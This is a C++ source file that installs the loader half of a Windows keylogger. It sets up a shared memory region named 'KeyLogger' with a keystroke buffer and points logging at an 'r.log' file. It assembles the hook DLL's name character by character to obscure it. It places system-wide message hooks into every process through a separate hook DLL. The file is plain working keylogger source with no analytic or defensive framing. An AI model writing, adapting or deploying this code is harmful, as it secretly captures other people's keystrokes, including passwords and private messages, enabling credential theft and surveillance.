// install_x64.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <Windows.h>

#define EXIT_HOOK 0x10086
#define KEY_BUF_SIZE	16

typedef	struct
{
	HWND	hActWnd;						//current actived window
	char	strRecordFile[MAX_PATH];
	char	keybuffer[KEY_BUF_SIZE];		//log buffer
	DWORD	usedlen;						//
	DWORD	LastMsgTime;
}TShared;

TShared* pShareData = NULL;
HANDLE	 hMapObj = INVALID_HANDLE_VALUE;
LPVOID	 lpMemBase = NULL;

extern "C" __declspec(dllimport) LRESULT CALLBACK GetMsgProc(int code, WPARAM wParam, LPARAM lParam);

#ifdef _WIN64
#pragma comment(lib,"hookdll_x64.lib")
#else
#pragma comment(lib,"hookdll_x86.lib")
#endif


void MyEntry() {
	MSG msg = { 0 };
	char* pLogFileName = 0;
	HINSTANCE hInstance = NULL;
	HHOOK	  hHook_0 = NULL;
	HHOOK	  hHook_1 = NULL;

#ifdef _WIN64
	char szModule[] = { 'h','o','o','k','d','l','l','_','x','6','4','.','d','l','l',0 };
#else
	char szModule[] = { 'h','o','o','k','d','l','l','_','x','8','6','.','d','l','l',0};
#endif

	hMapObj = CreateFileMappingA(
		INVALID_HANDLE_VALUE,
		NULL,
		PAGE_EXECUTE_READWRITE,
		0,
		0x1000,
		"KeyLogger");

	if (hMapObj == NULL)
		return;

	lpMemBase = (char*)MapViewOfFile(
		hMapObj,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		0x1000);

	if (lpMemBase == NULL)
		return;

	pShareData = (TShared*)lpMemBase;

	hInstance = GetModuleHandleA(szModule);
	
	GetModuleFileNameA(
		hInstance, 
		pShareData->strRecordFile, 
		sizeof(pShareData->strRecordFile)
	);

	pLogFileName = pShareData->strRecordFile + lstrlenA(pShareData->strRecordFile) - 1;
	while (pLogFileName >= pShareData->strRecordFile && *pLogFileName != '\\') --pLogFileName;

	++pLogFileName;
	*pLogFileName = NULL;
	pLogFileName[0] = '\\';
	pLogFileName[1] = 'r';
	pLogFileName[2] = '.';
	pLogFileName[3] = 'l';
	pLogFileName[4] = 'o';
	pLogFileName[5] = 'g';
	pLogFileName[6] = 0;
	
	hHook_0 = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, hInstance, 0);
	hHook_1 = SetWindowsHookEx(WH_CALLWNDPROC, GetMsgProc, hInstance, 0);;

	while(GetMessage(&msg, 0, 0, 0))
	{
		if (msg.message == EXIT_HOOK) 
		{
			break;
		}
		else 
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}
	
	UnhookWindowsHookEx(hHook_0);
	UnhookWindowsHookEx(hHook_1);

	if (lpMemBase)
	{
		UnmapViewOfFile(lpMemBase);
		lpMemBase = NULL;
	}
	if (hMapObj != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hMapObj);
		hMapObj = INVALID_HANDLE_VALUE;
	}
	ExitProcess(0);
}
